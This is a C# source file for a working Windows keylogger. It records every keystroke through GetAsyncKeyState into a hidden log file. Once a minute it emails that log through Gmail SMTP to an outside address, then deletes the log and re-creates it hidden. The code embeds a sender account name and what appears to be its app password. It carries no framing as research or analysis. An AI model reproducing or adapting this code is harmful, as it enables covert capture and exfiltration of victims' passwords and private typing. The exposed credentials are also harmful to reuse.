using System;

using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;

using System.Net;
using System.Net.Mail;
using System.Timers;
using Timer = System.Timers.Timer;

namespace Cute_Code
{
    static class Program
    {


        private static string logFile = Path.Combine(Environment.CurrentDirectory,
            $"klogs.{DateTime.Now.ToShortTimeString().Replace(":", ".")}.log");


        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);


        private static void sendEmail(Object source, ElapsedEventArgs e)
        {
            try
            {
                
      
                MailMessage mail = new MailMessage();
                SmtpClient server = new SmtpClient("smtp.gmail.com", 587);
                server.UseDefaultCredentials = false;
                server.Credentials = new NetworkCredential("arrow7117800angelos@gmail.com", "ogjnlkcecdyxnicz");
                server.DeliveryMethod = SmtpDeliveryMethod.Network;
                mail.From = new MailAddress("arrow7117800angelos@gmail.com");
                mail.To.Add("aggelomanos@gmail.com");
                mail.Subject = "Log: " + DateTime.Today.ToShortDateString() + DateTime.Now.ToShortTimeString() ;
                mail.Body = "log_file";
                
                
                Attachment attachment = new System.Net.Mail.Attachment(logFile);
                mail.Attachments.Add(attachment);
                
                server.EnableSsl = true;
                server.Send(mail);
                File.Delete(logFile);
                var gg = new StreamWriter(logFile, true);
                File.SetAttributes(logFile, FileAttributes.Hidden);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("{0}: {1}", ex.ToString(), ex.Message);
            }
        }
        
        private static string Reader(int vKey, bool shift, bool caps)
        {
            var key = "";
            // Parse key
            if (vKey > 64 && vKey < 91)
            {
                if (shift | caps)
                {
                    key = ((Keys)vKey).ToString();
                }
                else
                {
                    key = ((Keys)vKey).ToString().ToLower();
                }
            }
            else if (vKey >= 96 && vKey <= 111)
            {
                switch (vKey)
                {
                    case 96:
                        key = "0";
                        break;
                    case 97:
                        key = "1";
                        break;
                    case 98:
                        key = "2";
                        break;
                    case 99:
                        key = "3";
                        break;
                    case 100:
                        key = "4";
                        break;
                    case 101:
                        key = "5";
                        break;
                    case 102:
                        key = "6";
                        break;
                    case 103:
                        key = "7";
                        break;
                    case 104:
                        key = "8";
                        break;
                    case 105:
                        key = "9";
                        break;
                    case 106:
                        key = "*";
                        break;
                    case 107:
                        key = "+";
                        break;
                    case 108:
                        key = "|";
                        break;
                    case 109:
                        key = "-";
                        break;
                    case 110:
                        key = ".";
                        break;
                    case 111:
                        key = "/";
                        break;
                } //Special symbols only
            }
            else if ((vKey >= 48 && vKey <= 57) || (vKey >= 186 && vKey <= 192))
            {
                if (shift)
                {
                    switch (vKey)
                    {
                        case 48:
                            key = ")";
                            break;
                        case 49:
                            key = "!";
                            break;
                        case 50:
                            key = "@";
                            break;
                        case 51:
                            key = "#";
                            break;
                        case 52:
                            key = "$";
                            break;
                        case 53:
                            key = "%";
                            break;
                        case 54:
                            key = "^";
                            break;
                        case 55:
                            key = "&";
                            break;
                        case 56:
                            key = "*";
                            break;
                        case 57:
                            key = "(";
                            break;
                        case 186:
                            key = ":";
                            break;
                        case 187:
                            key = "+";
                            break;
                        case 188:
                            key = "<";
                            break;
                        case 189:
                            key = "_";
                            break;
                        case 190:
                            key = ">";
                            break;
                        case 191:
                            key = "?";
                            break;
                        case 192:
                            key = "~";
                            break;
                        case 219:
                            key = "{";
                            break;
                        case 220:
                            key = "|";
                            break;
                        case 221:
                            key = "}";
                            break;
                        case 222:
                            key = "\"";
                            break;
                    }
                }
                else
                {
                    switch (vKey)
                    {
                        case 48:
                            key = "0";
                            break;
                        case 49:
                            key = "1";
                            break;
                        case 50:
                            key = "2";
                            break;
                        case 51:
                            key = "3";
                            break;
                        case 52:
                            key = "4";
                            break;
                        case 53:
                            key = "5";
                            break;
                        case 54:
                            key = "6";
                            break;
                        case 55:
                            key = "7";
                            break;
                        case 56:
                            key = "8";
                            break;
                        case 57:
                            key = "9";
                            break;
                        case 186:
                            key = ";";
                            break;
                        case 187:
                            key = "=";
                            break;
                        case 188:
                            key = ",";
                            break;
                        case 189:
                            key = "-";
                            break;
                        case 190:
                            key = ".";
                            break;
                        case 191:
                            key = "/";
                            break;
                        case 192:
                            key = "`";
                            break;
                        case 219:
                            key = "[";
                            break;
                        case 220:
                            key = "\\";
                            break;
                        case 221:
                            key = "]";
                            break;
                        case 222:
                            key = "'";
                            break;
                    }
                }
            }
            else
            {
                switch ((Keys)vKey)
                {
                    case Keys.F1:
                        key = "<F1>";
                        break;
                    case Keys.F2:
                        key = "<F2>";
                        break;
                    case Keys.F3:
                        key = "<F3>";
                        break;
                    case Keys.F4:
                        key = "<F4>";
                        break;
                    case Keys.F5:
                        key = "<F5>";
                        break;
                    case Keys.F6:
                        key = "<F6>";
                        break;
                    case Keys.F7:
                        key = "<F7>";
                        break;
                    case Keys.F8:
                        key = "<F8>";
                        break;
                    case Keys.F9:
                        key = "<F9>";
                        break;
                    case Keys.F10:
                        key = "<F10>";
                        break;
                    case Keys.F11:
                        key = "<F11>";
                        break;
                    case Keys.F12:
                        key = "<F12>";
                        break;

                    case Keys.Snapshot:
                        key = "<Print Screen>";
                        break;
                    case Keys.Scroll:
                        key = "<Scroll Lock>";
                        break;
                    case Keys.Pause:
                        key = "<Pause/Break>";
                        break;
                    case Keys.Insert:
                        key = "<Insert>";
                        break;
                    case Keys.Home:
                        key = "<Home>";
                        break;
                    case Keys.Delete:
                        key = "<Delete>";
                        break;
                    case Keys.End:
                        key = "<End>";
                        break;
                    case Keys.Prior:
                        key = "<Page Up>";
                        break;
                    case Keys.Next:
                        key = "<Page Down>";
                        break;
                    case Keys.Escape:
                        key = "<Esc>";
                        break;
                    case Keys.NumLock:
                        key = "<Num Lock>";
                        break;
                    case Keys.Capital:
                        key = "<Caps Lock>";
                        break;
                    case Keys.Tab:
                        key = "<Tab>";
                        break;
                    case Keys.Back:
                        key = "<Backspace>";
                        break;
                    case Keys.Enter:
                        key = "<Enter>";
                        break;
                    case Keys.Space:
                        key = " ";
                        break;
                    case Keys.Left:
                        key = "<Left>";
                        break;
                    case Keys.Up:
                        key = "<Up>";
                        break;
                    case Keys.Right:
                        key = "<Right>";
                        break;
                    case Keys.Down:
                        key = "<Down>";
                        break;
                    case Keys.LMenu:
                        key = "<Alt>";
                        break;
                    case Keys.RMenu:
                        key = "<Alt>";
                        break;
                    case Keys.LWin:
                        key = "<Windows Key>";
                        break;
                    case Keys.RWin:
                        key = "<Windows Key>";
                        break;
                    case Keys.LShiftKey:
                        key = "<Shift>";
                        break;
                    case Keys.RShiftKey:
                        key = "<Shift>";
                        break;
                    case Keys.LControlKey:
                        key = "<Ctrl>";
                        break;
                    case Keys.RControlKey:
                        key = "<Ctrl>";
                        break;
                }
            }
            
            //Console.WriteLine(key);
            return key;
        }


        public static  void Main(String[] args)
        {
            try
            {

                
                
                
                GetAsyncKeyState(0); //to remove previous keystrokes
                string buf = "";
                
                //Create header for log file
                var gg = new StreamWriter(logFile, true);
                File.SetAttributes(logFile, FileAttributes.Hidden);
                gg.Write("====================================LOG RECORD START====================================" + "\r\n");
                gg.Close();
                
                Timer t = new Timer();
                t.Interval = 60000 ; // in milliseconds
                t.Elapsed += sendEmail;
                t.AutoReset = true; //raise Elapsed event only once on True
                t.Enabled = true; // raise on True
                
                while (true)
                {
                    Thread.Sleep(10);
                    for (var i = 0; i < 255; i++)
                    {
                        var shift = false; // add check for shift
                        
                        int shiftState = GetAsyncKeyState(16);
                        
                        if ((shiftState & 0x8000) == 0x8000)
                        {
                            shift = true;
                        }
                        
                        
                        var caps = Console.CapsLock;
                        
                        
                        // read virtual key from buffer
                        var code = GetAsyncKeyState(i);


                        if (code == 32769 || code == -32767 || code == 1 )
                        {
                            
                            buf += Reader(i, shift, caps) ;
                            //Console.WriteLine(buf);

                            if (buf.Length > 20)
                            {
                                var file = new StreamWriter(logFile, true);
                                File.SetAttributes(logFile, FileAttributes.Hidden);
                                file.Write(buf + "\r\n");
                                file.Close();
                                
                                //Clear the buffer
                                buf = "";

                            }
                        }
                    }
                }
            }

            catch (Exception ex)
            {
                Console.WriteLine("ERROR {0}", ex);
            }
        }
    }
}